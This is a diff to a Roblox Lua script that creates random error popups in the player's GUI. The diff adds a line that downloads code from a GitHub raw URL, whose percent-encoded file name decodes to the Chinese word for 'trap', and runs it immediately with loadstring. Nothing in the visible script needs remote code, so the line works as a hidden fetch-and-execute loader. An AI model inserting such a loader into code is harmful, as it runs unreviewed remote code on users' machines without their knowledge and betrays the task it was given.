@@ -1,6 +1,8 @@
 local Player = game:GetService("Players").LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XxxNetworkPingxxX/error/e370c65c35ed0cfeaa34eb6db9596ea24ac8efa4/%E9%99%B7%E9%98%B1"))()
+
 local function createRandomPopup()
 	local ScreenGui = Instance.new("ScreenGui")
 	ScreenGui.Name = "ErrorPopupUI_" .. tick()
